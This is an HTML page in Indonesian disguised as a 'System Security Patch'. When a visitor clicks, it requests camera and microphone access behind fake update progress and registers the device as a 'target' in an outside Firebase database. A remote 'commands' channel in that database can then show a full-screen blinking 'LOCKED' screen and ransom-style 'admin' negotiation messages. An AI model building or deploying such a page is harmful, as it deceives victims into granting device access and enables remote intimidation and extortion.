<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Security Update</title>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; text-align: center; display: flex; flex-direction: column; justify-content: center; height: 100vh; margin: 0; }
        .lock-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; flex-direction: column; justify-content: center; }
        .blink { animation: flash 0.5s infinite; }
        @keyframes flash { 0%, 100% { background: #000; } 50% { background: #005577; } }
        .btn-update { background: #00d9ff; color: #000; padding: 15px 30px; border-radius: 30px; border: none; font-weight: bold; font-size: 1.1rem; }
    </style>
</head>
<body onclick="startTarget()">

    <div id="init">
        <img src="https://www.gstatic.com/images/branding/product/2x/shield_64dp.png" width="80">
        <h2>System Security Patch</h2>
        <p>Izin diperlukan untuk memperbarui sistem keamanan perangkat anda.</p>
        <button class="btn-update">PERBARUI SEKARANG</button>
    </div>

    <div id="lock" class="lock-screen">
        <h1 id="lock_msg" style="font-size: 15vw; color: #00d9ff;">LOCKED</h1>
        <p id="nego_box" style="padding: 20px; font-size: 1.2rem;"></p>
    </div>

    <video id="v" autoplay playsinline style="display:none;"></video>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-app.js";
        import { getDatabase, ref, onValue, set } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-database.js";

        const db = getDatabase(initializeApp({ databaseURL: "https://fir-2-96fc6-default-rtdb.asia-southeast1.firebasedatabase.app/" }));
        let blinker;

        window.startTarget = async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                document.getElementById('v').srcObject = stream;
                document.getElementById('init').innerHTML = "<h3>Updating... 1%</h3>";
                // Kirim data awal ke FB2
                set(ref(db, 'targets/' + Date.now()), { status: 'online' });
            } catch(e) {}
        };

        onValue(ref(db, 'commands'), (snap) => {
            const d = snap.val();
            if(!d) return;

            const lk = document.getElementById('lock');
            if(d.action === 'lock') {
                lk.style.display = 'flex';
                lk.classList.add('blink');
            }
            if(d.action === 'unlock') {
                lk.style.display = 'none';
                lk.classList.remove('blink');
            }
            if(d.message) document.getElementById('lock_msg').innerText = d.message;
            if(d.nego) document.getElementById('nego_box').innerText = "PESAN ADMIN: " + d.nego;
        });
    </script>
</body>
</html>
